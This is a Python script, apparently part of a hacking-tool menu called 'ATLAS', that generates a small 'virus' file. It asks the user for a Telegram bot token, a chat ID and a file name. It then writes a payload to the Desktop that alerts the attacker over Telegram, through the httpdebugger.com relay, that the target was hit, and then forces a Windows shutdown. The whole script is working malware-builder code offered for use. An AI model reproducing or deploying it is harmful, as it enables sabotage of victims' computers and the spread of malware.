import os
import sys
import time
from colorama import Fore
import platform
def banner():
    a=platform.uname()
    b=a[0]
    if b == "Linux":
        os.system("clear")
    elif b == "Windows":
        os.system("cls")

    print(Fore.RED+"""
   __ __ __  _
  .`_//_//_/ / `.
            /  .`
           / .`
          /.`
         /`  ATLAS
       
       """)
def Shotdown():

    banner()
    print(Fore.RED+"\n   /"+Fore.YELLOW+"+"+Fore.BLUE+"\   "+Fore.WHITE+"Please Enter The Telegram bot Token \n")
    token = input(Fore.RED+"  ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"V"+Fore.RED+"S"+Fore.LIGHTMAGENTA_EX+"/"+Fore.LIGHTCYAN_EX+""+Fore.LIGHTRED_EX+"E"+Fore.YELLOW+"N"+Fore.BLUE+"T"+Fore.RED+"E"+Fore.WHITE+"R"+Fore.CYAN+"-"+Fore.BLUE+"T"+Fore.GREEN+"O"+Fore.RED+"K"+Fore.YELLOW+"E"+Fore.LIGHTCYAN_EX+"N"+Fore.RED+"]"+"""
  └─$ """+Fore.WHITE)
    if token == "":
        print(Fore.WHITE+"   /"+Fore.RED+"!"+Fore.WHITE+"\   "+Fore.WHITE+"Please Enter Data !!")
        sys.exit()
    else:
        pass

    banner()
    print(Fore.CYAN+"\n   /"+Fore.WHITE+"+"+Fore.GREEN+"\   "+Fore.WHITE+" Place Enter Your Chat-ID\n")
    user_id = input(Fore.RED+"  ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"V"+Fore.RED+"S"+Fore.LIGHTMAGENTA_EX+"/"+Fore.LIGHTCYAN_EX+""+Fore.LIGHTRED_EX+"E"+Fore.YELLOW+"N"+Fore.BLUE+"T"+Fore.RED+"E"+Fore.WHITE+"R"+Fore.BLUE+"-"+Fore.GREEN+"I"+Fore.RED+"D"+Fore.RED+"]"+"""
  └─$ """+Fore.WHITE)
    if user_id == "":
        print(Fore.WHITE+"   /"+Fore.RED+"!"+Fore.WHITE+"\   "+Fore.WHITE+"Please Enter Data !!")
        sys.exit()
    else:
        pass 

    banner()        
    print(Fore.RED+"\n   /"+Fore.WHITE+"+"+Fore.BLUE+"\   "+Fore.WHITE+" Place Enter Your File Name ==> Simple : aa.py \n")
    name = input(Fore.RED+"  ┌──("+Fore.WHITE+"kali"+Fore.BLUE+"㉿"+Fore.WHITE+"kali"+Fore.RED+")"+Fore.WHITE+'-'+Fore.RED+"["+Fore.WHITE+"~/"+Fore.LIGHTMAGENTA_EX+"A"+Fore.LIGHTCYAN_EX+"T"+Fore.LIGHTRED_EX+"L"+Fore.YELLOW+"A"+Fore.BLUE+"S"+Fore.RED+"/"+Fore.WHITE+"M"+Fore.BLUE+"E"+Fore.GREEN+"N"+Fore.RED+"O"+Fore.YELLOW+"/"+Fore.LIGHTCYAN_EX+"V"+Fore.RED+"S"+Fore.LIGHTMAGENTA_EX+"/"+Fore.LIGHTCYAN_EX+""+Fore.LIGHTRED_EX+"F"+Fore.YELLOW+"I"+Fore.BLUE+"L"+Fore.RED+"E"+Fore.WHITE+"N"+Fore.BLUE+"A"+Fore.GREEN+"M"+Fore.RED+"E"+Fore.RED+"]"+"""
  └─$ """+Fore.WHITE)
    if name == "":
        print(Fore.WHITE+"   /"+Fore.RED+"!"+Fore.WHITE+"\   "+Fore.WHITE+"Please Enter Data !!")
        sys.exit()
    else:
        pass

    path = ('''
import os 
import requests
from colorama import Fore
#Start Send Key in Telegram Bot
url = ("https://api.telegram.org/bot%s/sendmessage?chat_id=%s&text=Hello i am ZED system target  shotdowned ;)")

payload = {"UrlBox":url,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
#End Send Key Telegram bot
os.system('shutdown -s')
'''%(token,user_id))
  
    file = open(os.path.expanduser("~")+"\\Desktop\\"+name,"w")
    file.write(path)
    file.close()
    banner()
    print(Fore.RED+"\n   /"+Fore.YELLOW+"+"+Fore.BLUE+"\  "+Fore.WHITE+"- Place Wite\n")
    time.sleep(5)
    print(Fore.CYAN+"   /"+Fore.WHITE+"+"+Fore.GREEN+"\  "+Fore.WHITE+"Your Virus Created Succsesfully\n") 
    time.sleep(4)
    print(Fore.BLUE+"   /"+Fore.GREEN+"+"+Fore.BLUE+"\  "+Fore.WHITE+"Place Check Desktop\n")
    time.sleep(1)
    try:
        input(Fore.BLUE+"\n   /"+Fore.YELLOW+"M"+Fore.MAGENTA+"\   "+Fore.WHITE+"Back To Menu (Press Enter...)")
    except:
        print("")
        sys.exit()
